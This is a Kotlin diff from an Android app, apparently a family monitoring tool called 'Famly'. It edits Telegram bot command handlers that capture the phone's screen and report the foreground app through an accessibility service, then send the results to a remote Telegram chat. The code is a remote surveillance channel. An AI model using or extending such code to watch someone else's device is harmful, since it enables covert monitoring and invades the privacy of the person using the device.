@@ -303,12 +303,12 @@ class TelegramBotManager(private val context: Context) {
                     }
                 }
             }
-            "/screenshot", "/ss", "/layar", "/tangkap_layar" -> {
-                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary()
+            "/screenshot", "/schreenshot", "/ss", "/layar", "/tangkap_layar" -> {
+                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary(context)
                 executeSendMessage(
                     token,
                     chatId,
-                    "📸 <b>[Screenshot] Mengambil tangkapan layar real-time...</b>\n" +
+                    "📸 <b>[Screenshot] Mengambil tangkapan layar real-time...</b>\n\n" +
                             "$activeAppSummary\n\n" +
                             "<i>Mohon tunggu sebentar...</i>"
                 )
@@ -316,7 +316,7 @@ class TelegramBotManager(private val context: Context) {
                 ScreenshotHelper.captureScreenshot(context) { photoBytes ->
                     if (photoBytes != null && photoBytes.isNotEmpty()) {
                         CoroutineScope(Dispatchers.IO).launch {
-                            val caption = "📸 <b>[Famly] Tangkapan Layar Real-time</b>\n" +
+                            val caption = "📸 <b>[Famly] Tangkapan Layar Real-time</b>\n\n" +
                                     "$activeAppSummary\n🕒 <i>Waktu: $timeStr</i>"
                             val sent = sendPhoto(photoBytes, caption, chatId)
                             if (!sent) {
@@ -329,9 +329,8 @@ class TelegramBotManager(private val context: Context) {
                 }
             }
             "/app", "/aplikasi", "/buka" -> {
-                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary()
-                val isAccessActive = if (FamlyAccessibilityService.isServiceActive) "🟢 Aktif" else "🔴 Belum Diaktifkan"
-                val text = "🔍 <b>[Pemantauan Aplikasi Real-time]</b>\n\n$activeAppSummary\n\n⚙️ <i>Status Layanan Aksesibilitas: $isAccessActive</i>"
+                val activeAppSummary = FamlyAccessibilityService.getActiveAppSummary(context)
+                val text = "🔍 <b>[Pemantauan Aplikasi Real-time]</b>\n\n$activeAppSummary"
                 executeSendMessage(token, chatId, text)
             }
             "/start", "/help" -> {
